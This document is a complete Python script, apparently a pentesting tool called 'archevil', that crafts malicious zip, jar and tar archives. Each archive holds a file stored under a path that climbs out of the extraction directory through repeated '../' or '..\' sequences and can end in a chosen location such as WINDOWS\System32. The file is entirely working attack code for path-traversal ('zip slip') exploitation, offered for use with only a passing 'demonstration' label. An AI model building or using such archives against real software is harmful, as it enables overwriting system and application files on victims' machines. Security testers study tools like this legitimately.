import sys, zipfile, tarfile, os, argparse, logging

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')

def main(argv=sys.argv):
    parser = argparse.ArgumentParser(description='Create an archive, with optional directory traversal for demonstration purposes.',
                                     prog='archevil',
                                     usage='%(prog)s <input file> [options]')
    parser.add_argument('input_file', type=str, help='Input file to include in the archive')
    parser.add_argument('--output-file', '-o', dest='out',
                        help='Output archive file. Supported: zip, jar, tar, tar.bz2, tar.gz, tgz.')
    parser.add_argument('--depth', '-d', type=int, dest='depth', default=8,
                        help='Number of directories to traverse (default 8).')
    parser.add_argument('--platform', '-p', dest='platform', choices=['win', 'unix'],
                        help='Platform for the archive paths (win or unix).')
    parser.add_argument('--path', dest='path', default='',
                        help='Path to include in filename after traversal. E.g., WINDOWS\\System32\\')

    if len(sys.argv) == 1:
        parser.print_help(sys.stderr)
        sys.exit(1)

    options = parser.parse_args()
    if not os.path.exists(options.input_file):
        logging.error('Input file does not exist!')
        sys.exit(1)

    if not options.platform:
        logging.error('No platform specified!')
        sys.exit(1)

    if not options.out:
        logging.error('No output file specified!')
        sys.exit(1)

    directory_traversal_path = '..\\' if options.platform == 'win' else '../'
    if options.path and not options.path.endswith('\\' if options.platform == 'win' else '/'):
        options.path += '\\' if options.platform == 'win' else '/'

    zpath = directory_traversal_path * options.depth + options.path + os.path.basename(options.input_file)
    logging.info(f'Adding {zpath} to {options.out}')
    create_archive(options.input_file, zpath, options.out)
    logging.info(f'Success!')

def create_archive(input_file, internal_path, output_file):
    ext = os.path.splitext(output_file)[1]
    archive_mode = {'zip': 'a', 'jar': 'a', 'tar': 'w', 'gz': 'w:gz', 'tgz': 'w:gz', 'bz2': 'w:bz2'}
    mode = 'a' if os.path.exists(output_file) else 'w'

    if ext in ['.zip', '.jar']:
        with zipfile.ZipFile(output_file, mode) as archive:
            if any(x.filename == internal_path for x in archive.infolist()):
                logging.error(f'File {internal_path} already exists!')
                sys.exit(1)
            archive.write(input_file, internal_path)
    elif ext in ['.tar', '.gz', '.tgz', '.bz2']:
        with tarfile.open(output_file, archive_mode[ext[1:]] if ext[1:] in archive_mode else sys.exit(logging.error(f'Unsupported archive format: {ext}'))) as archive:
            archive.add(input_file, internal_path)
    else:
        logging.error(f'Unsupported archive format: {ext}')
        sys.exit(1)

if __name__ == '__main__':
     main()
